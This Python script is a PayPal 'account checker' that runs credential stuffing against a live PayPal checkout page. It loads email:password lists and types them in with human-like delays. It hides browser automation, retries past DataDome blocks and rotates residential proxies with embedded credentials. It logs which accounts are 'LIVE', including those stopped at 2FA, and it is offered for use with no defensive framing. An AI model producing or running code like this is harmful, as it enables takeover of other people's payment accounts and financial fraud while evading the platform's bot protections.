#!/usr/bin/env python3
"""
PayPal Express Checkout Account Checker v2
Supports: Chrome CDP mode + Playwright direct + proxy rotation
Tests accounts against active PayPal checkout session.
"""

import asyncio, re, sys, time, random
from pathlib import Path

CHECKOUT_URL = "https://www.paypal.com/checkoutnow?token=EC-2CM292865A548433E&sessionID=f8130d64-de5a-4325-8022-cc80ee49b8a1&buyerCountry=FR&locale.x=fr_FR"
ACCOUNTS_FILE = sys.argv[1] if len(sys.argv) > 1 else "accounts.txt"
OUTPUT_FILE = "paypal_results.txt"
MODE = sys.argv[2] if len(sys.argv) > 2 else "cdp"  # cdp, playwright, or playwright+proxy

# Geonode proxies for rotation
PROXIES = [
    "http://geonode_kCP1DJHBOT-type-residential-country-fr:d55d2bd5-8d2c-493f-9507-69b4cf7af095@prod-proxy.geonode.io:9000",
    "http://geonode_kCP1DJHBOT-type-residential-country-us:d55d2bd5-8d2c-493f-9507-69b4cf7af095@us.proxy.geonode.io:9000",
    "http://geonode_kCP1DJHBOT-type-residential-country-sg:d55d2bd5-8d2c-493f-9507-69b4cf7af095@sg.proxy.geonode.io:9000",
    "http://geonode_kCP1DJHBOT-type-residential:d55d2bd5-8d2c-493f-9507-69b4cf7af095@proxy.geonode.io:9000",
]

async def check_account(page, email, password, attempt=1):
    try:
        await page.goto(CHECKOUT_URL, wait_until="domcontentloaded", timeout=45000)
        await asyncio.sleep(3 + random.random() * 2)
        
        content = await page.content()
        url = page.url
        
        # Already logged in?
        if "checkoutnow" in url and "login_email" not in content:
            if "pay" in content.lower() or "confirm" in content.lower():
                return email, "SESSION_ACTIVE", url[:80]
        
        # Blocked?
        if "blocked" in content.lower() and "login_email" not in content:
            if attempt < 3:
                await asyncio.sleep(5)
                return await check_account(page, email, password, attempt + 1)
            return email, "BLOCKED", "DataDome after retries"
        
        # Find email field
        email_input = await page.query_selector('input[name="login_email"], input#email')
        if not email_input:
            return email, "NO_FORM", "Login form not found"
        
        await email_input.click()
        await asyncio.sleep(0.5)
        await email_input.fill("")
        await email_input.type(email, delay=random.randint(30, 80))
        await asyncio.sleep(0.5)
        
        # Click next
        try:
            next_btn = await page.query_selector('#btnNext, button[type="submit"], [data-testid="submitButton"]')
            if next_btn:
                await next_btn.click()
            else:
                await email_input.press("Enter")
        except:
            await email_input.press("Enter")
        
        await asyncio.sleep(4 + random.random() * 2)
        content = await page.content()
        
        # Password step?
        if "login_password" in content:
            pass_input = await page.query_selector('input[name="login_password"], input#password')
            if pass_input:
                await pass_input.click()
                await asyncio.sleep(0.5)
                await pass_input.fill("")
                await pass_input.type(password, delay=random.randint(30, 80))
                await asyncio.sleep(0.3)
                
                try:
                    login_btn = await page.query_selector('#btnLogin, button[type="submit"], [data-testid="submitButton"]')
                    if login_btn:
                        await login_btn.click()
                    else:
                        await pass_input.press("Enter")
                except:
                    await pass_input.press("Enter")
                
                await asyncio.sleep(5 + random.random() * 3)
                content = await page.content()
                url = page.url
                
                # Analyze result
                if "password was incorrect" in content.lower() or "incorrect" in content.lower():
                    return email, "LIVE - WRONG PASS", ""
                elif "verify" in content.lower() or "2fa" in content.lower() or "otp" in content.lower():
                    return email, "LIVE - 2FA REQUIRED", ""
                elif "code" in content.lower() and ("sms" in content.lower() or "text" in content.lower()):
                    return email, "LIVE - SMS CODE", ""
                elif "checkoutnow" in url:
                    return email, "LIVE - CHECKOUT", url[:80]
                elif "wallet" in url or "dashboard" in url or "myaccount" in url:
                    return email, "LIVE - LOGGED IN", url[:80]
                elif "security" in content.lower() or "unusual" in content.lower():
                    return email, "LIVE - SEC CHECK", ""
                elif "captcha" in content.lower() or "recaptcha" in content.lower():
                    return email, "LIVE - CAPTCHA", ""
                else:
                    return email, f"UNKNOWN", url[:60]
            else:
                return email, "LIVE - NO_PW_FIELD", str(len(content))
        
        elif "captcha" in content.lower():
            return email, "CAPTCHA_EMAIL", ""
        elif "doesn't exist" in content.lower() or "not found" in content.lower():
            return email, "NO_ACCOUNT", ""
        elif "block" in content.lower():
            return email, "BLOCKED", ""
        else:
            return email, f"UNKNOWN_E", str(len(content))
            
    except Exception as e:
        return email, "ERROR", str(e)[:80]


async def run_cdp():
    from playwright.async_api import async_playwright
    
    accounts = []
    with open(ACCOUNTS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line and ('@' in line or line.split(':')[0].isdigit()):
                parts = line.split(':', 1)
                accounts.append((parts[0].strip(), parts[1].strip()))
    
    print(f"Mode: CDP | Accounts: {len(accounts)}")
    
    async with async_playwright() as p:
        browser = await p.chromium.connect_over_cdp("http://127.0.0.1:9222")
        context = browser.contexts[0] if browser.contexts else await browser.new_context()
        page = await context.new_page()
        
        live_count = 0
        for i, (email, password) in enumerate(accounts):
            print(f"[{i+1}/{len(accounts)}] {email}...")
            result = await check_account(page, email, password)
            
            icon = "✅" if "LIVE" in result[1] else "🔴" if "ERR" in result[1] or "NO" in result[1] or "BLOCK" in result[1] else "🟡"
            print(f"  {icon} {result[1]} | {result[2][:50]}")
            
            if "LIVE" in result[1]:
                live_count += 1
            
            with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{result[0]}|{result[1]}|{result[2]}\n")
            
            await asyncio.sleep(2 + random.random() * 2)
        
        print(f"\n=== DONE ===")
        print(f"LIVE: {live_count}/{len(accounts)}")


async def run_playwright():
    from playwright.async_api import async_playwright
    
    accounts = []
    with open(ACCOUNTS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line and ('@' in line or line.split(':')[0].isdigit()):
                parts = line.split(':', 1)
                accounts.append((parts[0].strip(), parts[1].strip()))
    
    use_proxy = MODE == "playwright+proxy"
    print(f"Mode: {'Playwright+Proxy' if use_proxy else 'Playwright'} | Accounts: {len(accounts)}")
    
    async with async_playwright() as p:
        launch_args = {
            "headless": False,
            "args": [
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
            ]
        }
        
        browser = await p.chromium.launch(**launch_args)
        live_count = 0
        
        for i, (email, password) in enumerate(accounts):
            proxy_cfg = None
            if use_proxy:
                proxy_url = PROXIES[i % len(PROXIES)]
                proxy_cfg = {"server": proxy_url}
            
            ctx_args = {
                "viewport": {"width": 1920, "height": 1080},
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "locale": "fr-FR",
            }
            if proxy_cfg:
                ctx_args["proxy"] = proxy_cfg
            
            context = await browser.new_context(**ctx_args)
            page = await context.new_page()
            
            print(f"[{i+1}/{len(accounts)}] {email} (proxy {i%len(PROXIES) if use_proxy else 'none'})...")
            result = await check_account(page, email, password)
            
            icon = "✅" if "LIVE" in result[1] else "🔴" if "ERR" in result[1] or "NO" in result[1] or "BLOCK" in result[1] else "🟡"
            print(f"  {icon} {result[1]} | {result[2][:50]}")
            
            if "LIVE" in result[1]:
                live_count += 1
            
            with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{result[0]}|{result[1]}|{result[2]}\n")
            
            await context.close()
            await asyncio.sleep(1)
        
        await browser.close()
        print(f"\n=== DONE ===")
        print(f"LIVE: {live_count}/{len(accounts)}")


if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════╗
║   PayPal Checkout Account Checker v2    ║
║   Token: EC-2CM292865A548433E           ║
╚══════════════════════════════════════════╝

Usage:
  python paypal_checkout_checker.py accounts.txt cdp
  python paypal_checkout_checker.py accounts.txt playwright
  python paypal_checkout_checker.py accounts.txt playwright+proxy

CDP mode requires Chrome running with:
  chrome.exe --remote-debugging-port=9222 --disable-blink-features=AutomationControlled
""")
    
    if MODE == "cdp":
        asyncio.run(run_cdp())
    else:
        asyncio.run(run_playwright())
